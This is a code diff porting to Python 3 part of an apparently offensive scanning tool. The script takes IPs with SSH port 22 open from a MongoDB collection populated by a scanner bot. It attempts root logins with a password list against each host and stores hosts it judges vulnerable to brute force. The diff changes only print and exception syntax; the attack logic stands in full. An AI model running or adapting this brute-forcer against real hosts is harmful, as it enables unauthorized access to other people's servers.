@@ -48,16 +48,16 @@ def insert_mongodb(IP):
 		date_Insert = time.strftime("%H:%M:%S")
 		date_Update = "none"
 		cursor = db.Shodita.insert({"ip":IP, "date_insert": date_Insert, "date_Update": date_Update, "ssh_BF":"ok", "bot":"Gigante-ssh"})
-		print "[INFO] INSERT IN DB"
+		print ("[INFO] INSERT IN DB")
 	except:
-		print "[WARNING]ERROR INSERT MONGODB"
+		print ("[WARNING]ERROR INSERT MONGODB")
 
 def get_target():
 	global client, db
 	cursor = db.Shodita.find({"port":22, "bot":"Nobita"})
 	for document in cursor:
 		if check_ip_mongodb(document["ip"]):
-			print colores.azul + "[*][TARGET]" + document["ip"] + " target already insert in DB" + colores.normal
+			print (colores.azul + "[*][TARGET]" + document["ip"] + " target already insert in DB" + colores.normal)
 		else:
 			check_sshBF(document["ip"])
 
@@ -69,7 +69,7 @@ def check_ip_mongodb(ip):
 		return False
 
 def check_sshBF(ip):
-	print colores.HEADER + "[*][TARGET] SSH connect to " + ip + colores.normal
+	print (colores.HEADER + "[*][TARGET] SSH connect to " + ip + colores.normal)
 	paramiko.util.log_to_file("filename.log")
 	fail = 0
 	user="root"
@@ -77,32 +77,32 @@ def check_sshBF(ip):
 		ssh = paramiko.SSHClient()
 		ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 		try:
-			print colores.verde + "|----[INFO] Try user: root password: " + p + colores.normal
+			print (colores.verde + "|----[INFO] Try user: root password: " + p + colores.normal)
 			ssh.connect(ip, username=user, password=p, timeout=10)
-		except paramiko.AuthenticationException, error:
-			print "|----[ERROR] incorrect password... root@" + ip + ":" + p
+		except paramiko.AuthenticationException as error:
+			print ("|----[ERROR] incorrect password... root@" + ip + ":" + p)
 			continue
-		except socket.error, error:
+		except socket.error as error:
 			fail += 1
-			print error
+			print (error)
 			continue
-		except paramiko.SSHException, error:
+		except paramiko.SSHException as error:
 			fail += 1
-			print error
-			print "|----[ERROR]Most probably this is caused by a missing host key"
+			print (error)
+			print ("|----[ERROR]Most probably this is caused by a missing host key")
 			continue
-		except Exception, error:
+		except Exception as error:
 			fail += 1
-			print "|----[ERROR]Unknown error: " + str(error)
+			print ("|----[ERROR]Unknown error: " + str(error))
 			continue    
 		except:
 			fail += 1
 		ssh.close()
 	if fail == 0:
-		print colores.FAIL + "|----[INFO] " + ip + " has a brute force vulnerability in SSH..." + colores.normal
+		print (colores.FAIL + "|----[INFO] " + ip + " has a brute force vulnerability in SSH..." + colores.normal)
 		insert_mongodb(ip)
 	else:
-		print colores.verde + "|----[INFO] " + ip + " is protected..." + colores.normal
+		print (colores.verde + "|----[INFO] " + ip + " is protected..." + colores.normal)
 
 def main():
 	get_target()
